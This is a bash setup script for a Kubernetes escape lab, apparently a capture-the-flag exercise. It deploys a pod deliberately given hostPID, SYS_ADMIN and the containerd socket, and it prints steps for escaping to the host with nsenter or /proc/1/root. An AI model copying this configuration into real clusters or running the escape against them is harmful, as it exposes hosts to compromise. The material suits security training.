#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-16-cri-socket"

FLAG="${CVE_FLAG:-flag{k8s-16-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-16"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-16] CRI Socket Access Container Escape"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

echo "[*] Loading container images into KIND..."
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
kind load docker-image nginx:1.24-alpine --name "$CLUSTER_NAME" 2>/dev/null || true

echo "[*] Deploying pod with CRI socket access + hostPID..."
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: cri-escape-pod
spec:
  hostPID: true
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
        runAsUser: 0
        capabilities:
          add:
            - SYS_PTRACE
            - SYS_ADMIN
      volumeMounts:
        - name: cri-sock
          mountPath: /run/containerd/containerd.sock
          readOnly: true
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: cri-sock
      hostPath:
        path: /run/containerd/containerd.sock
        type: Socket
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

echo "[*] Waiting for pod to be ready..."
kubectl wait --for=condition=Ready pod/cri-escape-pod --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[+] K8S-16 CRI Socket Escape Ready"
echo "    Flag directory: $FLAG_DIR"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. kubectl exec -it cri-escape-pod -- sh"
echo "    2. ls -la /run/containerd/containerd.sock  (confirm CRI socket access)"
echo "    3. nsenter --target 1 --mount cat /host-flag/flag.txt"
echo "       OR: cat /proc/1/root/host-flag/flag.txt  (read flag via host /proc)"
